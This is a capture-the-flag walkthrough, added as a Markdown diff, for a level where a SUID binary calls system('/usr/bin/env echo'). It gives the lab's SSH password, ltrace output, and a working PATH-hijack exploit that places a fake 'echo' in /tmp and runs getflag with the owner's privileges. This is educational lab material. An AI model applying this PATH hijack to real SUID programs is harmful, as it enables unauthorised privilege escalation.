@@ -1,0 +1,53 @@
+# 03
+
+Login
+
+```b
+> ssh level03@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: kooda2puivaav1idi4f57q8iq
+```
+
+Inspect
+- ❌ `file` `readelf` `strings` 
+- also try `id, namei`
+
+```
+> ls -l
+-rwsr-sr-x 1 flag03 level03 8627 level03
+ ^^^
+    ^^^ SUID and SGID are set for exec, ie. whichever user/group run the
+        bin, it exec w/ temporary privileges of the owner of the file
+
+👉 when ./level03 is run
+  the entire process runs with owner flag03's priviledges, 
+  ie. we gain temporary permissions as flag03
+```
+
+✅ Use `ltrace` 
+- tracing library function calls when the binary is executed
+
+```b
+> ltrace ./level03
+
+### output
+getegid()                                           = 2003
+geteuid()                                           = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+system("/usr/bin/env echo Exploit me" ...
+
+### observations
+👉 sets the real u/g id, the effective u|g id and
+the saved set-user|group-ID of the calling process
+```
+
+- Solution
+
+```b
+> whereis getflag
+getflag: /bin/getflag
+> echo -e "/bin/getflag" > /tmp/echo
+> chmod +x /tmp/echo
+> export PATH=/tmp:$PATH  👈 prepend tmp to get it checked first
+> ./level03
+```
